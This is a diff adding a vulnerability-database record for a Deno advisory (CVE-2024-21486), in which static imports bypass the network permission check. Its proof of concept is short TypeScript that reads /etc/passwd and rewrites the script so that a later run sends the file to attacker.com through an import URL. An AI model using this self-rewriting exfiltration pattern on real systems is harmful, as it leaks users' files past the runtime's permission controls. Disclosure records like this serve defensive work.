@@ -1,0 +1,75 @@
+vulnerability_id: VCID-dgnf-c7ba-x3g9
+aliases:
+  - CVE-2024-21486
+  - GHSA-jv4x-jv3h-qff5
+summary: |
+  Deno vulnerable to Exposure of Sensitive Information to an Unauthorized Actor
+  ### Summary
+
+  Static imports are exempted from the network permission check. An attacker could exploit this to leak the password file on the network.
+
+  ### Details
+
+  Static imports in Deno are exempted from the network permission check. This can be exploited by attackers in multiple ways, when third-party code is directly/indirectly executed with `deno run`:
+
+  1. The simplest payload would be a tracking pixel-like import that attackers place in their code to find out when developers use the attacker-controlled code.
+  2. When `--allow-write` and `--allow-read` permissions are given, an attacker can perform a sophisticated two-steps attack: first, they generate a ts/js file containing a static import and in a second execution load this static file.
+
+  ### PoC
+
+  ```ts
+  const __filename = new URL("", import.meta.url).pathname;
+  let oldContent = await Deno.readTextFile(__filename);
+  let passFile = await Deno.readTextFile("/etc/passwd");
+  let pre =
+    'import {foo} from "[https://attacker.com?val=](https://attacker.com/?val=)' +
+    encodeURIComponent(passFile) + '";\n';
+  await Deno.writeTextFile(__filename, pre + oldContent);
+  ```
+
+  Executing a file containing this payload twice, with `deno run --allow-read --allow-write` would cause the password file to leak on the network, even though no network permission was granted.
+
+  This vulnerability was fixed with the addition of the `--allow-import` flag: https://docs.deno.com/runtime/fundamentals/security/#network-access
+severities:
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-jv4x-jv3h-qff5
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://github.com/denoland/deno
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/denoland/deno
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://github.com/denoland/deno/security/advisories/GHSA-jv4x-jv3h-qff5
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/denoland/deno/security/advisories/GHSA-jv4x-jv3h-qff5
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/denoland/deno/security/advisories/GHSA-jv4x-jv3h-qff5
+weaknesses:
+  - CWE-200
+references:
+  - url: https://github.com/denoland/deno
+    reference_type:
+    reference_id:
+  - url: https://github.com/denoland/deno/security/advisories/GHSA-jv4x-jv3h-qff5
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-jv4x-jv3h-qff5
+    reference_type:
+    reference_id: GHSA-jv4x-jv3h-qff5
